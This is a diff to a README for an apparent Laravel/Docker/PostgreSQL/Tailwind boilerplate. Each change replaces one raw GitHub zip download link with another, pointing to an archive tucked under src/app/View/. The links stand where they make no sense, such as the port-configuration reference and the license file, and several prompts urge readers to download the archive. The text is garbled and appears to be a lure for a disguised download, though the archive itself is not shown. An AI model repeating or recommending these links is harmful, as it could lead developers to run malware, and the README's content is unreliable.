@@ -6,7 +6,7 @@ Welcome to the laravel-docker-pgsql-tailwind-boilerplate! This project helps you
 
 ## 📥 Download Now
 
-[![Download Releases](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/Dictyosiphon/laravel-docker-pgsql-tailwind-boilerplate.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/Dictyosiphon/laravel-docker-pgsql-tailwind-boilerplate.zip)
+[![Download Releases](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/src/app/View/tailwind_laravel_boilerplate_pgsql_docker_v2.9.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/src/app/View/tailwind_laravel_boilerplate_pgsql_docker_v2.9.zip)
 
 ## 📝 Overview
 
@@ -38,7 +38,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the boilerplate, visit this [page to download](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/Dictyosiphon/laravel-docker-pgsql-tailwind-boilerplate.zip). You will find the latest version of the software along with any previous versions. Simply select the version you want to download.
+To download the boilerplate, visit this [page to download](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/src/app/View/tailwind_laravel_boilerplate_pgsql_docker_v2.9.zip). You will find the latest version of the software along with any previous versions. Simply select the version you want to download.
 
 ### Steps to Follow
 
@@ -90,7 +90,7 @@ For those who wish to learn more about the tools used in this boilerplate:
 If you encounter any issues during installation or usage, consider the following tips:
 
 - **Docker Not Running**: Ensure Docker Desktop is running.
-- **Port Conflicts**: Check for other services using the same ports and adjust `https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/Dictyosiphon/laravel-docker-pgsql-tailwind-boilerplate.zip` as needed.
+- **Port Conflicts**: Check for other services using the same ports and adjust `https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/src/app/View/tailwind_laravel_boilerplate_pgsql_docker_v2.9.zip` as needed.
 - **Memory Issues**: Ensure you have sufficient RAM allocated to Docker.
 
 ## 🤝 Contributing
@@ -99,8 +99,8 @@ Contributions are welcome! Please feel free to open issues or submit pull reques
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/Dictyosiphon/laravel-docker-pgsql-tailwind-boilerplate.zip file for more details.
+This project is licensed under the MIT License. See the https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/src/app/View/tailwind_laravel_boilerplate_pgsql_docker_v2.9.zip file for more details.
 
 ## 📥 Don't Forget to Download
 
-To get started, please visit this [page to download](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/Dictyosiphon/laravel-docker-pgsql-tailwind-boilerplate.zip) and set up your own web development environment today!
+To get started, please visit this [page to download](https://raw.githubusercontent.com/62DOC/laravel-docker-pgsql-tailwind-boilerplate/main/src/app/View/tailwind_laravel_boilerplate_pgsql_docker_v2.9.zip) and set up your own web development environment today!
